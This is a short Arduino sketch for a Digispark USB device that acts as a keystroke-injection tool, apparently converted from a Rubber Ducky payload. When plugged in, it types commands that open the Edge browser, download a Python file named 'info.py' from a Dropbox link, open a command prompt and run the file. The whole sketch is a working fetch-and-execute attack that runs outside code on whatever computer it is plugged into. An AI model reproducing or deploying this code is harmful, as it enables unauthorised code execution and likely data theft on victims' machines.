// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(41,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("edge");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("https://www.dropbox.com/s/5sqysq6qlvxh275/info.py?dl=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd Downloads");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("info.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
